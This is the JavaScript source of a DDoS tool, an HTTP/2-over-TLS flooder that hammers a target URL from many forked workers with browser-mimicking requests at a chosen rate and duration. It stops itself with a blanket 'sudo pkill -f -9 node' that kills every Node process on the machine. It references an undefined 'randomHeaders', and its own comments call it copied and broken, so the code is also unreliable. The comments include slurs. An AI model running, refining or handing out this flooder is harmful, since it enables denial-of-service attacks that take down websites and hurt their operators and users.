// this shit hella skidded
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const { HeaderGenerator } = require('header-generator');
const { exec } = require('child_process');
process.setMaxListeners(0); 
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {  });

if (process.argv.length < 6){console.log(`Shit TLS-Flood by hex | @udp_cat \n node tls-shit.js target time rps threads`); process.exit();}
const headers = {};

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)]; 
}  

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "firefox", minVersion: 100, httpVersion: "2"},
    ],
    devices: [
        "desktop",
    ],
    operatingSystems: [
        "windows",
    ],
    locales: ["en-US", "en"]
});

function stopFlooder() {
    // most fucking retarded way of stoping this shit, cant get it to work...
    console.log("Stopping...");
    exec('sudo pkill -f -9 node', (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
    process.exit();
}

if (cluster.isMaster) {
    console.log(`Master ${process.pid} is running`);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    cluster.on('exit', function(worker) {
        console.log('Worker ' + worker.process.pid + ' died');
        cluster.fork();
    }); 
} else {
    setInterval(runFlooder, 1000);
    setTimeout(stopFlooder, args.time * 1000); 
}
headers[":method"] = "GET";
headers["GET"] = " / HTTP/2";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["Referer"] = args.target;
headers["accept"] = randomHeaders['accept'];
headers["accept-language"] = randomHeaders['accept-language'];
headers["accept-encoding"] = randomHeaders['accept-encoding']; 
headers["Connection"] = "keep-alive";
headers["upgrade-insecure-requests"] = randomHeaders['upgrade-insecure-requests'];
headers["TE"] = "trailers";
headers["x-requested-with"] = "XMLHttpRequest";  
headers["pragma"] =  "no-cache";
headers["Cookie"] = randomHeaders['cookie'];  
// hardcoded :443 port
function runFlooder() {
    const userAgentv2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0";
    var useragent = userAgentv2.toString();
    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = useragent;

    const tlsOptions = {
        ALPNProtocols: ['h2'],
        followAllRedirects: true,
        challengeToSolve: 5,
        clientTimeout: 5000,
        clientlareMaxTimeout: 15000,
        echdCurve: "GREASE:X25519:x25519",
        ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
        rejectUnauthorized: false,
        honorCipherOrder: true,
        requestCert: true,
        secure: true,
        port: 443,
        uri: parsedTarget.host,
        servername: parsedTarget.host,
    };  
    
    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);   
    
    tlsConn.setKeepAlive(true, 60 * 10000);  
    
    const client = http2.connect(parsedTarget.href, {
        protocol: "https:",
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false 
        },
        maxSessionMemory: 64000,
        maxDeflateDynamicTableSize: 4294967295,
        createConnection: () => tlsConn,
    });    
    
    client.settings({
        headerTableSize: 65536,
        maxConcurrentStreams: 20000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false 
    });
      
    client.on("connect", () => {
        const IntervalAttack = setInterval(() => {
            for (let i = 0; i < args.Rate; i++) {
                const request = client.request(headers)  
                
                .on("response", response => {
                    request.close();
                    request.destroy();  
                    return 
                });
    
                request.end();
            }
        }, 1000);                 
    }); 

    client.on("close", () => {
        client.destroy();
        return;
    });

    client.on("error", error => {
        client.destroy();
        return;
    });
} 
// this faggot AINT WORKING
const KillScript = () => process.exit(1);  
setTimeout(KillScript, args.time * 1000);